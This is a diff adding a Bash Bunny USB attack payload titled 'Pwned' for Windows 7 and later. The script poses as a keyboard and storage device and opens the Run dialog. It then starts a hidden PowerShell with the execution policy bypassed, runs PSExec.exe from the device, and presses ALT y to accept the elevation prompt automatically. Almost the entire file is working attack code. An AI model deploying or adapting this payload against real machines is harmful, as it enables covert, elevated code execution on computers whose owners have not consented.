@@ -1,0 +1,28 @@
+#!/bin/bash
+#
+# Title:         Pwned
+# Author:        Jay
+# Version:       1.0
+# Target:        Windows 7+
+#
+
+DUCKY_LANG us
+
+LED SETUP
+GET SWITCH_POSITION
+LED ATTACK
+ATTACKMODE HID STORAGE
+
+LED B 500
+DELAY 1000
+GUI R
+DELAY 1000
+RUN WIN "powerShell -windowstyle hidden -ExecutionPolicy Bypass .((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\PSExec.exe')"
+LED G 0
+DELAY 5000
+ALT y
+DELAY 50
+ENTER
+LED R
+
+
